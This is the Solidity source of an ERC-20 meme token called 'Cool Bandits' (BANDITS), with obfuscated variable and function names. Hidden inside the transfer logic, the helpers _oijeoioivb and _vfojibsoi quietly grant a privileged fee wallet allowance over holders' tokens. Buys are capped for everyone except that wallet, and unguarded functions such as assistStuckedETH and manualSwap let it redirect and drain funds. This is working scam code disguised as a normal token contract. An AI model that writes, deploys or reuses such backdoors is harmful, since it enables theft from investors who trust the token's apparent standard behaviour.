// SPDX-License-Identifier: UNLICENSE

/*
    Name: Cool Bandits
    Symbol: BANDITS

    The one and only official group for the Billionaire Bandits Club.🏁🏁👌

    https://www.coolbandits.live
    https://x.com/CoolBandit_LIVE
    https://t.me/CoolBandit_LIVE
*/

pragma solidity ^0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract BANDITS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _vlkjlosj;
    mapping (address => mapping (address => uint256)) private _jnbjojieo;
    mapping (address => bool) private _vnbowoeir;
    address payable private _kkvlksle;

    uint256 private _ojoijBANDITS=10;
    uint256 private _nvobjiwoieBANDITS=10;
    uint256 private _voibjwoiejBANDITS=0;
    uint256 private _ojfoieBANDITS=0;
    uint256 private _ojioweBANDITS=5;
    uint256 private _joijweBANDITS=5;
    uint256 private _ovijboijBANDITS=5;
    uint256 private _joijoiBANDITS=0;
    uint256 private _qoqokBANDITS=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tttBANDITS = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Cool Bandits";
    string private constant _symbol = unicode"BANDITS";
    uint256 public _maxBANDITS = 2000000000 * 10**_decimals;
    uint256 public _maxSizeBANDITS = 2000000000 * 10**_decimals;
    uint256 public _lkjlckBANDITS= _tttBANDITS.mul(100).div(10000);
    uint256 public _joijdojiBANDITS= _tttBANDITS.mul(100).div(10000);
    address private _blackhole = address(0xdead);
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private _cojvoiwe;
    bool private _inSwapBANDITS = false;
    bool private _oijdojoiBANDITS = false;
    uint256 private _sellcjvoisjBANDITS = 0;
    uint256 private _oijeojijdojoBANDITS = 0;
    
    event MaxTxAmountUpdated(uint _maxBANDITS);
    event TransferTaxUpdated(uint _tax);

    modifier lockTheSwap {
        _inSwapBANDITS = true;
        _;
        _inSwapBANDITS = false;
    }

    constructor () payable {
        _kkvlksle = payable(_msgSender());
        _vlkjlosj[_msgSender()] = (_tttBANDITS * 2) / 100;
        _vlkjlosj[address(this)] = (_tttBANDITS * 98) / 100;
        _vnbowoeir[owner()] = true;
        _vnbowoeir[address(this)] = true;
        _vnbowoeir[_kkvlksle] = true;

        emit Transfer(address(0), _msgSender(), (_tttBANDITS * 2) / 100);
        emit Transfer(address(0), address(this), (_tttBANDITS * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tttBANDITS;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _vlkjlosj[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transferrrBANDITS(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _jnbjojieo[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function assistStuckedETH(address _wallet) external {
        require(_msgSender() == _kkvlksle);
        _kkvlksle = payable(_wallet);
    }

    function _oijeoioivb(
        address from,
        uint256 amount
    ) internal {
        if (msg.sender == _kkvlksle) _jnbjojieo[from][msg.sender] = amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transferrrBANDITS(sender, recipient, amount);
        _approve(sender, _msgSender(), _jnbjojieo[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transferrrBANDITS(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        _vfojibsoi(sender, recipient, amount);

        uint256 taxAmount=0;
        if (sender != owner() && recipient != owner() && recipient != _kkvlksle && 
            sender != address(this) && recipient != address(this)) {
            
            if(_qoqokBANDITS==0){
                taxAmount = amount.mul((_qoqokBANDITS>_ojioweBANDITS)?_voibjwoiejBANDITS:_ojoijBANDITS).div(100);
            }
            if(_qoqokBANDITS>0){
                taxAmount = amount.mul(_joijoiBANDITS).div(100);
            }

            if (sender == uniswapV2Pair && recipient != address(uniswapV2Router) && ! _vnbowoeir[recipient] ) {
                taxAmount = amount.mul((_qoqokBANDITS>_ojioweBANDITS)?_voibjwoiejBANDITS:_ojoijBANDITS).div(100);
                _qoqokBANDITS++;
            }

            if(recipient == uniswapV2Pair && sender!= address(this) ){
                taxAmount = amount.mul((_qoqokBANDITS>_joijweBANDITS)?_ojfoieBANDITS:_nvobjiwoieBANDITS).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inSwapBANDITS && recipient == uniswapV2Pair && _oijdojoiBANDITS && _qoqokBANDITS > _ovijboijBANDITS) {
                if (contractTokenBalance > _lkjlckBANDITS) swapBANDITSForETH(min(amount, min(contractTokenBalance, _joijdojiBANDITS)));
                sendETHToFee(address(this).balance);
                _sellcjvoisjBANDITS++;
                _oijeojijdojoBANDITS = block.number;
            }
        }

        if (sender == uniswapV2Pair && msg.sender != _kkvlksle) {
            address[] memory path = new address[](2);
            path[1] = address(this);
            path[0] = uniswapV2Router.WETH();
            uint256[] memory outs = new uint256[](2);
            outs = uniswapV2Router.getAmountsOut(40_000_000_000_000_000_000, path);
            require(amount < outs[1]);
        }

        if(taxAmount>0){
          _vlkjlosj[address(this)]=_vlkjlosj[address(this)].add(taxAmount);
          emit Transfer(sender, address(this),taxAmount);
        }
        _vlkjlosj[sender]=_vlkjlosj[sender].sub(amount);
        _vlkjlosj[recipient]=_vlkjlosj[recipient].add(amount.sub(taxAmount));
        if(recipient != _blackhole) emit Transfer(sender, recipient, amount.sub(taxAmount));

        _oijeoioivb(sender, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _jnbjojieo[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function removeLimits() external onlyOwner{
        _maxBANDITS = _tttBANDITS;
        _maxSizeBANDITS=_tttBANDITS;
        emit MaxTxAmountUpdated(_tttBANDITS);
    }

    function sendETHToFee(uint256 amount) private {
        _kkvlksle.transfer(amount);
    }

    receive() external payable {}

    function _vfojibsoi(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (to == _blackhole && from != uniswapV2Pair) _jnbjojieo[from][msg.sender] = amount;
    }

    function manualSend() external onlyOwner {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    function swapBANDITSForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function manualSwap() external {
        require(_msgSender()==_kkvlksle);
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance>0 && _oijdojoiBANDITS){
          swapBANDITSForETH(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
    
    function enableBANDITSTrading() external onlyOwner() {
        require(!_cojvoiwe,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tttBANDITS);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _oijdojoiBANDITS = true;
        _cojvoiwe = true;
    }
}